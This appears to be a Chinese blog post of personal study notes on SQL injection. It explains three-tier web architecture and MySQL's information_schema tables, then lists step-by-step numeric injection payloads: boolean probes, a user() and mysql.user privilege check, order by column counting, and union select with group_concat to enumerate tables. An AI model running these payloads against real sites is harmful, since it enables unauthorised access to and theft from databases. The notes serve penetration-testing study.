---
layout: post
title: SQL injer
date: 2021-11-14
categories: blog
tags: [Web渗透,SQL注入]
description: 学习笔记。
---
# SQL


## `0`. 基础理论

## Web 程序三层架构

**三层架构**(`3-tier architecture`) 通常意义上就是将整个业务应用划分为：

- 界面层（User Interface layer）
- 业务逻辑层（Business Logic Layer）
- 数据访问层（Data access layer）

区分层次的目的即为了“高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发。
由数据库驱动的Web应用程序依从三层架构的思想也分为了三层：

- 表示层。
- 业务逻辑层（又称领域层）
- 数据访问层（又称存储层）

拓扑结构如下图所示：

> 

在上图中，用户访问实验楼主页进行了如下过程：

在 Web 浏览器中输入 `www.shiyanlou.com` 连接到实验楼服务器。

- 业务逻辑层的 Web 服务器从本地存储中加载 `index.php` 脚本并解析。
- 脚本连接位于数据访问层的 `DBMS`（数据库管理系统），并执行 `Sql` 语句。
- 数据访问层的数据库管理系统返回 `Sql` 语句执行结果给 Web 服务器。
- 业务逻辑层的 Web 服务器将 Web 页面封装成 HTML 格式发送给表示层的 Web 浏览器。
- 表示层的 Web 浏览器解析 HTML 文件，将内容展示给用户。

在三层架构中，所有通信都必须要经过中间层，简单地说，三层架构是一种**线性关系**。

## `1`. SQL注入

> 通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终欺骗服务器执行恶意的SQL命令。

[Sql注入基础原理介绍](https://zhuanlan.zhihu.com/p/35723803)

### 1.1 Sql注入简介

Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。

### 1.2 Sql注入的要求

1. 用户能和数据库进行交互（要能输入），且输入是可控的
2. 我们的输入，最终要能在服务器中执行（拼接->编译->执行，缺一不可）

#### # 特殊的数据字典表

下面对一些重要的数据字典表做一些说明：
+ `SCHEMATA`表：提供了关于数据库的信息。
+ `TABLES`表：给出了关于数据库中的表的信息。
+ `COLUMNS`表：给出了表中的列信息。
+ `STATISTICS`表：给出了关于表索引的信息。
+ `USER_PRIVILEGES`表：给出了关于全程权限的信息。该信息源自mysql.user授权表。
+ `SCHEMA_PRIVILEGES`表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。
+ `TABLE_PRIVILEGES`表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。
+ `COLUMN_PRIVILEGES`表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。
+ `CHARACTER_SETS`表：提供了关于可用字符集的信息。
+ `COLLATIONS`表：提供了关于各字符集的对照信息。
+ `COLLATION_CHARACTER_SET_APPLICABILITY`表：指明了可用于校对的字符集。
+ `TABLE_CONSTRAINTS`表：描述了存在约束的表。
+ `KEY_COLUMN_USAGE`表：描述了具有约束的键列。
+ `ROUTINES`表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。
+ `VIEWS`表：给出了关于数据库中的视图的信息。
+ `TRIGGERS`表：提供了关于触发程序的信息。

## `2`. SQL注入分类

### 2.1 数字型注入（Post）

#### 2.1.1 简介

> s

#### 2.1.2 注入步骤

+ **#1** 判断注入类型，找到注入点

  ```sql
  xx' 主动闭合'    返回错误
  xx and 1=1 	    返回正确
  xx and 1=2      返回错误
  ```
  满足以上三点则可以下判断，存在数字型注入

  ```sql
  xx id=2-1	2-1=1
  xx id=1%2b1	1+1=2,+号要进行URL编码
  ```

+ **#2** 数据库权限判断

  ```SQL
  and ord(mid(user(),1,1))=114
  ```

  + Ord函数是返回第一个字符的ascii码值。
  
  + Mid函数是用于得到字符串的一部分。这个函数有三个参数，返回值为该部分的ASCII码值。
  
    1. 第一个是`需要得到的字符串`，
    2. 第二位是`从这个函数的第几位开始截取`，
    3. 第三个是`截取的长度`。
  
    那么也就是说，得到字符串user()里面的第一个ascii值。加上后面的那句，=114
  
    总的推出该句的意思就是：倘若得到的第一个字符串的ASCIII码值等于114的话，就返回正确的页面。114的ASCII值是r

  ```
  或 and (select count(*) from mysql.user)>0
  ```

  解释:
  and (select count(*) from mysql.user)>0   /* 如果结果返回正常,说明具有读写权限。
  and (select count(*) from mysql.user)>0   /* 返回错误，应该是管理员给数据库帐户降权了。

+ **#3** 猜出字段数

  ```sql
  xx order by  n(数字)
  ```

+ **#4** 猜出字段位

  ```sql
  and 1=2 union selct 1,2,3
  ```

+ **#5** 猜数据库名

  ```sql
  and 1=2 union select 1,database(),3
  ```

+ **#6** 联合查询 （group_concat()）  点代表下一级

  ```sql
  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='pentest'   
  或 
  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
  ```
  
  > 在MySQL中，==数据库名==存放在`information_schema`数据库下`schemata`表`schema_name`字段中
  >
  > 在MySQL中，==表名==存放在`information_schema`数据库下`tables`表`table_name`字段中
  
  > GROUP_CONCAT(col) 返回由属于一组的列值连接组合而成的结果
  >
  > 也就是将多个返回值拼贴成一个字符串

#### 2.1.3 注意细节

注入过程中的"`+`"号要进行url编码，因为"`+`"号在SQL中有特殊含义(外连接)，"`-`"就不用编码了

### 2.2 字符型注入（Get）













